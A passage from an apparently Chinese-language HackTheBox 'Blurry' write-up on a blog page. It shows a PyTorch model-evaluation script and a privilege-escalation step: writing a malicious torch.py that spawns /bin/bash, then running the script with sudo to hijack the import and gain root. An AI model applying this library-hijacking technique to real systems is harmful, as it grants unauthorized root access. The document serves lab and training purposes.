class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms</span><br><span class="line"><span class="keyword">from</span> torchvision.datasets <span class="keyword">import</span> CIFAR10</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader, Subset</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CustomCNN</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(CustomCNN, self).__init__()</span><br><span class="line">        self.conv1 = nn.Conv2d(in_channels=<span class="number">3</span>, out_channels=<span class="number">16</span>, kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(in_channels=<span class="number">16</span>, out_channels=<span class="number">32</span>, kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line">        self.pool = nn.MaxPool2d(kernel_size=<span class="number">2</span>, stride=<span class="number">2</span>, padding=<span class="number">0</span>)</span><br><span class="line">        self.fc1 = nn.Linear(in_features=<span class="number">32</span> * <span class="number">8</span> * <span class="number">8</span>, out_features=<span class="number">128</span>)</span><br><span class="line">        self.fc2 = nn.Linear(in_features=<span class="number">128</span>, out_features=<span class="number">10</span>)</span><br><span class="line">        self.relu = nn.ReLU()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.pool(self.relu(self.conv1(x)))</span><br><span class="line">        x = self.pool(self.relu(self.conv2(x)))</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">32</span> * <span class="number">8</span> * <span class="number">8</span>)</span><br><span class="line">        x = self.relu(self.fc1(x))</span><br><span class="line">        x = self.fc2(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_model</span>(<span class="params">model_path</span>):</span><br><span class="line">    model = CustomCNN()</span><br><span class="line">    </span><br><span class="line">    state_dict = torch.load(model_path)</span><br><span class="line">    model.load_state_dict(state_dict)</span><br><span class="line">    </span><br><span class="line">    model.<span class="built_in">eval</span>()  </span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prepare_dataloader</span>(<span class="params">batch_size=<span class="number">32</span></span>):</span><br><span class="line">    transform = transforms.Compose([</span><br><span class="line">        transforms.RandomHorizontalFlip(),</span><br><span class="line">        transforms.RandomCrop(<span class="number">32</span>, padding=<span class="number">4</span>),</span><br><span class="line">        transforms.ToTensor(),</span><br><span class="line">        transforms.Normalize(mean=[<span class="number">0.4914</span>, <span class="number">0.4822</span>, <span class="number">0.4465</span>], std=[<span class="number">0.2023</span>, <span class="number">0.1994</span>, <span class="number">0.2010</span>]),</span><br><span class="line">    ])</span><br><span class="line">    </span><br><span class="line">    dataset = CIFAR10(root=<span class="string">&#x27;/root/datasets/&#x27;</span>, train=<span class="literal">False</span>, download=<span class="literal">False</span>, transform=transform)</span><br><span class="line">    subset = Subset(dataset, indices=np.random.choice(<span class="built_in">len</span>(dataset), <span class="number">64</span>, replace=<span class="literal">False</span>))</span><br><span class="line">    dataloader = DataLoader(subset, batch_size=batch_size, shuffle=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> dataloader</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">evaluate_model</span>(<span class="params">model, dataloader</span>):</span><br><span class="line">    correct = <span class="number">0</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():  </span><br><span class="line">        <span class="keyword">for</span> images, labels <span class="keyword">in</span> dataloader:</span><br><span class="line">            outputs = model(images)</span><br><span class="line">            _, predicted = torch.<span class="built_in">max</span>(outputs.data, <span class="number">1</span>)</span><br><span class="line">            total += labels.size(<span class="number">0</span>)</span><br><span class="line">            correct += (predicted == labels).<span class="built_in">sum</span>().item()</span><br><span class="line">    </span><br><span class="line">    accuracy = <span class="number">100</span> * correct / total</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Accuracy of the model on the test dataset: <span class="subst">&#123;accuracy:<span class="number">.2</span>f&#125;</span>%&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">model_path</span>):</span><br><span class="line">    model = load_model(model_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Loaded Model.&quot;</span>)</span><br><span class="line">    dataloader = prepare_dataloader()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Dataloader ready. Evaluating model...&quot;</span>)</span><br><span class="line">    evaluate_model(model, dataloader)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python script.py &lt;path_to_model.pth&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        model_path = sys.argv[<span class="number">1</span>]  <span class="comment"># Path to the .pth file</span></span><br><span class="line">        main(model_path)</span><br></pre></td></tr></table></figure>
+
+<p>注意到有导入torch库，并且该文件夹具有写权限</p>
+<p><img src="/article/Blurry/image-20240901234440204.png"></p>
+<p>尝试创建同名py文件劫持torch库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;import os; os.system(&quot;/bin/bash&quot;)&#x27; &gt; torch.py</span><br><span class="line">sudo /usr/bin/evaluate_model /models/demo_model.pth</span><br></pre></td></tr></table></figure>
+
+<p>成功提权拿到root的flag</p>
+<p><img src="/article/Blurry/image-20240901235511794.png"></p>
+<hr>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>漏洞利用</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://medium.com/@vishalchaudharydevsec/hacking-clearml-using-malicious-pickle-file-upload-pickle-deserialization-41182d731cd2">https://medium.com/@vishalchaudharydevsec/hacking-clearml-using-malicious-pickle-file-upload-pickle-deserialization-41182d731cd2</a></li>
+</ul>
+<p>Linux搭建python虚拟环境</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://kuanghy.github.io/2015/12/04/virtualenv">http://kuanghy.github.io/2015/12/04/virtualenv</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Linux/" rel="tag"># Linux</a>
+              <a href="/tags/HackTheBox/" rel="tag"># HackTheBox</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/%E5%BB%BA%E7%AB%8B%E5%85%B1%E4%BA%AB%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6.html" rel="prev" title="建立共享获取敏感文件">
+      <i class="fa fa-chevron-left"></i> 建立共享获取敏感文件
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html" rel="next" title="Craft CMS远程代码执行漏洞">
+      Craft CMS远程代码执行漏洞 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Blurry"><span class="nav-number">1.</span> <span class="nav-text">Blurry</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="nav-number">1.2.</span> <span class="nav-text">外网打点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.3.</span> <span class="nav-text">权限提升</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">1.4.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rev1ve"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">rev1ve</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rev1ve</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
+      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
+      placeholder: "快来评论叭",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
